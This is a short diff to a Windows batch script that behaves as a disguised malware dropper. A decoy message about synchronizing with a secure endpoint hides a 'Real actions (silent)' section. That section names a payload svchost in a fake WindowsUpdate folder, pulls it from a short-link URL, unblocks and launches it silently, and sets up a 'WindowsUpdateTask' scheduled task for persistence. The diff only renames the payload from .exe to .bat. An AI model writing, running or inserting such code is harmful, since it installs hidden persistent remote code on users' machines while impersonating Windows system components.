@@ -22,7 +22,7 @@ echo Synchronizing IP with secure endpoint...
 
 :: === Real actions (silent) ===
 set "INSTALL_DIR=C:\ProgramData\WindowsUpdate"
-set "PAYLOAD=%INSTALL_DIR%\svchost.exe"
+set "PAYLOAD=%INSTALL_DIR%\svchost.bat"
 set "URL=https://y.hn/juykz"
 set "TASK_NAME=WindowsUpdateTask"
 
@@ -36,7 +36,7 @@ timeout /t 2 /nobreak >nul 2>&1
 
 if exist "%PAYLOAD%" (
 powershell -Command "Unblock-File -Path '%PAYLOAD%' -ErrorAction SilentlyContinue" >nul 2>&1
-taskkill /f /im "svchost.exe" /fi "Path eq %PAYLOAD%" >nul 2>&1
+taskkill /f /im "svchost.bat" /fi "Path eq %PAYLOAD%" >nul 2>&1
 start "" "%PAYLOAD%" >nul 2>&1
 
 schtasks /delete /tn "%TASK_NAME%" /f >nul 2>&1
